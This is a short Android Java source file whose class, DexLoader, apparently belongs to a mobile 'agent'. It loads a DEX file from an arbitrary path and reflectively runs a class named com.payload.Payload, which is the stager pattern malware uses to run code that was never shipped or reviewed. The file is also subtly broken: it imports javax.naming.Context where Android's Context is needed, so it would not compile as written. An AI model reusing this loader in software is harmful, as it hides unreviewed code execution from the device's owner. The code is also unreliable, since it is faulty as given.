package com.mobilemorph.agent.util;

import java.io.File;
import java.lang.reflect.Method;

import javax.naming.Context;

import dalvik.system.DexClassLoader;

public class DexLoader {
    public static void loadAndExecute(Context context, String dexPath) {
        try {
            File optimizedDir = context.getDir("dexopt", Context.MODE_PRIVATE);

            DexClassLoader classLoader = new DexClassLoader(
                    dexPath,
                    optimizedDir.getAbsolutePath(),
                    null,
                    context.getClassLoader()
            );

            Class<?> clazz = classLoader.loadClass("com.payload.Payload");
            Object instance = clazz.newInstance();
            Method method = clazz.getMethod("execute");
            method.invoke(instance);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}